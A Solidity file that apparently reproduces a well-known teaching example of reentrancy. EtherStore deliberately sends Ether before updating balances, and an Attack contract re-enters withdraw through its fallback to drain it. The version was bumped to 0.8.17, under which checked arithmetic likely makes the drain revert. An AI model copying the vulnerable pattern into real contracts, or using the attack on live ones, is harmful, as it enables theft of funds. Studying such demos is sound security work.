// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
// pragma solidity ^0.6.10; Original Contract

contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint _amount) public {
        require(balances[msg.sender] >= _amount, "must have deposit");

        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "failed to send Ether");

        balances[msg.sender] -= _amount;
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) public {
        etherStore = EtherStore(_etherStoreAddress);
    }

    fallback() external payable {
        if(address(etherStore).balance >= 1 ether) {
            etherStore.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "then");
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw(1 ether);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
} 